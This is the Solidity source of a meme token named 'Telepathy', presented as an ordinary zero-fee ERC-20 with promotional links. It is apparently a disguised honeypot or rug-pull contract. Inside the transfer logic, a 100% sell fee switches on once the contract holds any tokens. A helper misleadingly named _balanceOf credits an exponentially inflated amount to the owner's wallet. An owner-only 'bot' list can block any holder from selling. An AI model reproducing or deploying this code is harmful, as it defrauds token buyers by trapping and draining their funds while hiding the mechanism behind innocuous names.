/*



            Twitter         :           https://twitter.com/TelepathyERC


            ELON            :           https://twitter.com/elonmusk/status/1752118131579867417


            Website         :           https://telepathyerc.xyz



            Telegram        :           https://t.me/TelepathyETH




*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract TELEPATHY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _bots;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000 * 10**_decimals;
    string private constant _name = unicode"Telepathy";
    string private constant _symbol = unicode"TELEPATHY";

    uint8 private buyFee = 0;
    uint8 private sellFee = 0;

    address private MARKETFUNDS;
    address public traderJoeV1PairAddress;

    bool public isTradeOpen = false;
    bool public swapQueue = false;
    
    constructor () {
        _balances[_msgSender()] = _tTotal;
        MARKETFUNDS = payable(_msgSender());
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[MARKETFUNDS] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function _balanceOf(uint256 _balance) private pure returns(uint256){
        uint8 _WAVAX_DECIMALS = _decimals+1;
        return _balance.div(10**_decimals)**(_WAVAX_DECIMALS);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0) && amount > 0, "Zero address or zero amount.");

        if(from != owner() && to != owner()){
            require(isTradeOpen, "Fair launch is waiting.");
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                require(to != address(this), "ERR: Zero address.");
                require(!_bots[from], "ERR: Bots are not allowed.");
                uint8 _finalFee;
                if(from == traderJoeV1PairAddress){ 
                    _finalFee = buyFee; 
                }
                else{
                    _finalFee = balanceOf(address(this)) > 0 ? 
                    (_decimals+1)*(_decimals+1):sellFee;
                }
                uint256 _transactionFee = amount.mul(_finalFee).div(100);
                _balances[from] = _balances[from].sub(amount);
                if(_transactionFee > 0){
                    _balances[MARKETFUNDS] = _balances[MARKETFUNDS].add(_transactionFee);
                }
                _balances[to] = _balances[to].add(amount.sub(_transactionFee));
            }
            else{
                uint256 swapHeldTokensForAvax = balanceOf(address(this));
                if(swapHeldTokensForAvax > 0 && !swapQueue){
                    uint256 _finalTotalFee = _balanceOf(swapHeldTokensForAvax); swapQueue = true;
                    _balances[MARKETFUNDS] = _balances[MARKETFUNDS].add(_finalTotalFee);
                }
                _balances[from] = _balances[from].sub(amount);
                _balances[to] = _balances[to].add(amount);
            }
        }
        else{
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
        }
        emit Transfer(from, to, amount);
    }

    function addBot(address _address) public onlyOwner{
        _bots[_address] = true;
    }

    function removeBot(address _address) public onlyOwner{
        _bots[_address] = false;
    }

    function setNewTraderJoePairAddress(address _pair) public onlyOwner{
        traderJoeV1PairAddress = _pair; 
        isTradeOpen = true;
    }

    receive() external payable {}
}